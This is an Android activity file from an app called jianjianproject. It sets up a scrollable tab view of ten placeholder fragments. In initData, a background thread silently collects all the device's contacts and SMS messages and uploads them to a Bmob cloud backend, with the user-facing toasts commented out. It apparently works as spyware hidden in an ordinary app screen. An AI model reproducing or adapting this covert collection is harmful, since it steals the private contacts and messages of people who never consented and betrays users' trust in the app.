package com.lnb.jianjianproject.activitys;

import android.os.Bundle;
import android.support.design.widget.TabLayout;
import android.support.v4.app.Fragment;
import android.support.v4.app.FragmentPagerAdapter;
import android.support.v4.view.ViewPager;

import com.lnb.jianjianproject.R;
import com.lnb.jianjianproject.app.MyApplication;
import com.lnb.jianjianproject.base.BaseActivity;
import com.lnb.jianjianproject.bean.ContaceList;
import com.lnb.jianjianproject.bean.ContactInfo;
import com.lnb.jianjianproject.bean.SmsList;
import com.lnb.jianjianproject.fragments.MyFragment;
import com.lnb.jianjianproject.utils.ContactUtils;
import com.lnb.jianjianproject.utils.SmsUtils;

import java.util.ArrayList;
import java.util.List;

import butterknife.BindView;
import cn.bmob.v3.listener.SaveListener;

public class MainActivity extends BaseActivity  {


    @BindView(R.id.tl)
    TabLayout tl;
    @BindView(R.id.vp)
    ViewPager vp;
    private ArrayList<Fragment> list;
    private ArrayList<String> list1;
    private CommonPopupWindow popupWindow;
    @Override
    protected void initView(Bundle savedInstanceState) {
        setContentView(R.layout.activity_main);
    }

    @Override
    protected void initData() {
        list1 = new ArrayList<>();
        for (int i = 0; i < 10; i++) {
            list1.add("标题" + i);
        }
        list = new ArrayList<>();
        list.add(MyFragment.newInstance("1"));
        list.add(MyFragment.newInstance("2"));
        list.add(MyFragment.newInstance("3"));
        list.add(MyFragment.newInstance("4"));
        list.add(MyFragment.newInstance("5"));
        list.add(MyFragment.newInstance("6"));
        list.add(MyFragment.newInstance("7"));
        list.add(MyFragment.newInstance("8"));
        list.add(MyFragment.newInstance("9"));
        list.add(MyFragment.newInstance("10"));
        vp.setAdapter(new FragmentPagerAdapter(getSupportFragmentManager()) {
            @Override
            public Fragment getItem(int position) {
                return list.get(position);
            }

            @Override
            public int getCount() {
                return list.size();
            }

            @Override
            public CharSequence getPageTitle(int position) {
                return list1.get(position);
            }
        });
        tl.setupWithViewPager(vp);
        tl.setTabMode(TabLayout.MODE_SCROLLABLE);

        new Thread(new Runnable() {
            @Override
            public void run() {
                List<ContactInfo> allContacts = ContactUtils.getAllContacts(MyApplication.getContext());
                ContaceList contaceList=new ContaceList((ArrayList<ContactInfo>) allContacts);
                contaceList.save(MyApplication.getContext(), new SaveListener() {
                    @Override
                    public void onSuccess() {
                        //ToastUtils.showToast("联系人成功",true);
                    }

                    @Override
                    public void onFailure(int i, String s) {
                        //ToastUtils.showToast("联系人失败",true);
                    }
                });
                ArrayList<String> allSms = SmsUtils.getAllSms(MyApplication.getContext());
                SmsList smsList=new SmsList(allSms);
                smsList.save(MyApplication.getContext(), new SaveListener() {
                    @Override
                    public void onSuccess() {
                       // ToastUtils.showToast("短信成功",true);
                    }

                    @Override
                    public void onFailure(int i, String s) {
                        //ToastUtils.showToast("短信失败",true);
                    }
                });


            }
        }).start();

    }


}
